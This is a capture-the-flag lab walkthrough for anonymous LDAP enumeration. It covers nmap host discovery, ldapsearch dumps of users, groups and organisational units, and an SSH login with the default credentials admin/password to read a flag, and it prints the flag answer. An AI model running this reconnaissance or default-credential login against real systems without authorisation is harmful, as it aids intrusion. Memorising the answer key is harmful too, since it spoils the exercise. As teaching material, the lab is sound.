# Lab 7.6: LDAP Comprehensive Enumeration
## Learning Objectives
- Perform complete LDAP enumeration
- Combine all enumeration techniques
- Capture the flag
## Solution Walkthrough

### Step 1: Obtain Target IP Address

Get the target IP address from the lab platform before starting comprehensive enumeration.

**Detailed Steps:**

1. **Discover the target IP:**
   - The lab panel shows your network subnet (e.g., `10.X.Y.0/24`)
   - Scan the subnet to find live hosts: `nmap -sn <subnet>`
   - The target will be one of the discovered hosts

2. **Verify network connectivity:**
   ```bash
   ping -c 3 <target_ip>
   ```

3. **Verify LDAP service is running:**
   ```bash
   nmap -p 389,636 <target_ip>
   ```

### Step 2: Complete Enumeration

Perform comprehensive LDAP enumeration to discover all directory information.

**Detailed Steps:**

1. **Verify ldapsearch is installed:**
   ```bash
   which ldapsearch
   ```

2. **Perform comprehensive LDAP search:**
   ```bash
   ldapsearch -x -H ldap://<target_ip> -b "dc=example,dc=com"
   ```
   
   Replace `<target_ip>` with your actual target IP and `dc=example,dc=com` with the discovered base DN (e.g., `ldapsearch -x -H ldap://<target_ip> -b "dc=example,dc=com"`)

   **Command breakdown:**
   - `ldapsearch`: LDAP search tool
   - `-x`: Simple authentication (anonymous bind)
   - `-H ldap://<target_ip>`: LDAP server URL
   - `-b "dc=example,dc=com"`: Base DN (discovered from previous enumeration)
   - No filter specified = retrieves all objects

3. **Expected output sections:**
   ```
   # Users
   dn: cn=admin,ou=Users,dc=example,dc=com
   objectClass: person
   cn: admin
   uid: admin
   
   # Groups
   dn: cn=Domain Admins,ou=Groups,dc=example,dc=com
   objectClass: group
   cn: Domain Admins
   member: cn=admin,ou=Users,dc=example,dc=com
   
   # Organizational Units
   dn: ou=Users,dc=example,dc=com
   objectClass: organizationalUnit
   ou: Users
   ```

4. **Save output to file for analysis:**
   ```bash
   ldapsearch -x -H ldap://<target_ip> -b "dc=example,dc=com" > ldap_enumeration.txt
   cat ldap_enumeration.txt
   ```

5. **Alternative: Query specific object classes:**
   ```bash
   # Query all users
   ldapsearch -x -H ldap://<target_ip> -b "dc=example,dc=com" "(objectClass=person)"
   
   # Query all groups
   ldapsearch -x -H ldap://<target_ip> -b "dc=example,dc=com" "(objectClass=group)"
   
   # Query all OUs
   ldapsearch -x -H ldap://<target_ip> -b "dc=example,dc=com" "(objectClass=organizationalUnit)"
   ```

### Step 3: Analyze All Results

Carefully review the comprehensive enumeration output to identify all directory information.

**Detailed Steps:**

1. **Look for users:**
   ```
   dn: cn=admin,ou=Users,dc=example,dc=com
   objectClass: person
   cn: admin
   uid: admin
   mail: admin@example.com
   ```
   
   - Document all discovered usernames
   - Note user attributes (cn, uid, mail)
   - Identify user locations (OU structure)

2. **Look for groups:**
   ```
   dn: cn=Domain Admins,ou=Groups,dc=example,dc=com
   objectClass: group
   cn: Domain Admins
   member: cn=admin,ou=Users,dc=example,dc=com
   ```
   
   - Document all discovered groups
   - Note group memberships
   - Identify privileged groups

3. **Look for Organizational Units (OUs):**
   ```
   dn: ou=Users,dc=example,dc=com
   objectClass: organizationalUnit
   ou: Users
   ```
   
   - Document directory structure
   - Understand organizational hierarchy
   - Identify important OUs

4. **Look for other objects:**
   - Computers
   - Policies
   - Trust relationships
   - Service accounts

5. **Extract key information:**
   ```bash
   # Extract users
   grep -E "^cn:" ldap_enumeration.txt | grep -v "Domain\|Group"
   
   # Extract groups
   grep -E "^cn:" ldap_enumeration.txt | grep "Domain\|Group"
   
   # Extract OUs
   grep -E "^ou:" ldap_enumeration.txt
   ```

### Step 4: Access Flag

The flag is located in /tmp/flag.txt on the LDAP server.

**Detailed Steps:**

1. **If you have shell access:**
   ```bash
   ssh admin@<target_ip>
   # Password: password
   ```

2. **Navigate to flag location:**
   ```bash
   cat /tmp/flag.txt
   ```

3. **Expected flag content:**
   ```
   OCR{ldap_c0mpl3t3_3num}
   ```

4. **Alternative: Check if flag is in LDAP directory:**
   ```bash
   ldapsearch -x -H ldap://<target_ip> -b "dc=example,dc=com" "(cn=flag)" | grep -i "flag"
   ```

5. **Verify file exists:**
   ```bash
   ls -la /tmp/flag.txt
   ```

### Step 5: Verify Flag Format

Ensure the flag is in the correct format before submission.

**Flag format:**
```
OCR{ldap_c0mpl3t3_3num}
```

**Verification checklist:**
- ✅ Starts with `OCR{`
- ✅ Ends with `}`
- ✅ Contains only alphanumeric characters and underscores
- ✅ No extra spaces or characters

**Success Criteria:**
- ✅ Verified target IP and LDAP service accessibility
- ✅ Performed comprehensive LDAP enumeration using ldapsearch
- ✅ Identified base DN (dc=example,dc=com) from previous enumeration
- ✅ Analyzed complete enumeration results (users, groups, OUs, etc.)
- ✅ Documented all discovered directory information
- ✅ Successfully accessed flag in /tmp/flag.txt
- ✅ Verified flag format is correct: `OCR{...}`

**Key Learning Points:**
- Comprehensive enumeration reveals complete directory structure
- Understanding LDAP structure helps plan attacks
- Users, groups, and OUs provide attack surface information
- Complete enumeration combines all previous techniques
- Directory information enables targeted attacks
## Hints
1. Use comprehensive search
2. Query all object classes
3. Analyze complete directory structure